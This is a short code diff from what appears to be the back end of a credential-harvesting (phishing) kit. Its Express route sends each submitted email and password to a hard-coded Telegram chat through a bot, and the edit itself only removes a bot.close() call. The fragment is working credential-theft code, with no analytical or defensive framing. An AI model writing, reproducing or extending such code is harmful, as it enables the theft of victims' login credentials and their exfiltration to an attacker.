@@ -17,7 +17,6 @@ const route = router.use("/", function (req, res, next) {
     try {
         // bot.sendMessage(chatId, `username: ${email} : password ${pass}`);
         bot.sendMessage(623167587 , `username: ${email} : password ${pass}`);
-        bot.close();
         
 
         res.send({ good: 'good' });
